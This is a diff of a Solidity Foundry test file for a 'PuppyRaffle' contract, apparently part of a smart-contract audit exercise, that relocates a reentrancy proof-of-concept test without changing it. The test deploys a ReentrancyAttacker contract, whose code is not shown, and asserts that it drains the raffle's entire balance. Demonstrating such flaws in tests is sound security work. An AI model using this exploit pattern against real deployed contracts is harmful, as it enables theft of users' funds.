@@ -261,41 +261,6 @@ contract PuppyRaffleTest is Test {
         // comparing to the players entering 190-200
     }
 
-    function test_Reentrancy() public {
-        address[] memory players = new address[](4);
-        players[0] = playerOne;
-        players[1] = playerTwo;
-        players[2] = playerThree;
-        players[3] = playerFour;
-        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
-
-        uint256 raffleBalanceBefore = address(puppyRaffle).balance;
-
-        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
-
-        address attackUser = makeAddr("attackUser");
-        vm.deal(attackUser, 1 ether);
-
-        uint256 startingAttackContractBalance = address(attackerContract).balance;
-
-        vm.startPrank(attackUser);
-        attackerContract.attack{value: entranceFee}();
-        vm.stopPrank();
-        // attacker has entered the raffle.
-
-        uint256 endingAttackContractBalance = address(attackerContract).balance;
-        uint256 raffleBalanceAfterAttack = address(puppyRaffle).balance;
-
-        console.log("Starting attacker contract balance: ", startingAttackContractBalance);
-        console.log("Starting Raffle Balance", raffleBalanceBefore);
-
-        console.log("Ending attacker contract balance: ", endingAttackContractBalance);
-        console.log("Raffle Balance After Attack", raffleBalanceAfterAttack);
-
-        assertEq(endingAttackContractBalance, startingAttackContractBalance + 5 ether, "attackerContractBalance");
-        assertEq(raffleBalanceAfterAttack, 0);
-    }
-
     function test_TotalFeesOverflow() public playersEntered {
         // we finish a raffle of 4 to collect some fees
 
@@ -354,6 +319,41 @@ contract PuppyRaffleTest is Test {
 
         uint256 precisionLostFee = puppyRaffle.totalFees();
         console.log("Total Fees", precisionLostFee); // 1553255926290448384
+    }
+
+    function test_Reentrancy() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        uint256 raffleBalanceBefore = address(puppyRaffle).balance;
+
+        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+
+        address attackUser = makeAddr("attackUser");
+        vm.deal(attackUser, 1 ether);
+
+        uint256 startingAttackContractBalance = address(attackerContract).balance;
+
+        vm.startPrank(attackUser);
+        attackerContract.attack{value: entranceFee}();
+        vm.stopPrank();
+        // attacker has entered the raffle.
+
+        uint256 endingAttackContractBalance = address(attackerContract).balance;
+        uint256 raffleBalanceAfterAttack = address(puppyRaffle).balance;
+
+        console.log("Starting attacker contract balance: ", startingAttackContractBalance);
+        console.log("Starting Raffle Balance", raffleBalanceBefore);
+
+        console.log("Ending attacker contract balance: ", endingAttackContractBalance);
+        console.log("Raffle Balance After Attack", raffleBalanceAfterAttack);
+
+        assertEq(endingAttackContractBalance, startingAttackContractBalance + 5 ether, "attackerContractBalance");
+        assertEq(raffleBalanceAfterAttack, 0);
     }
 }
 
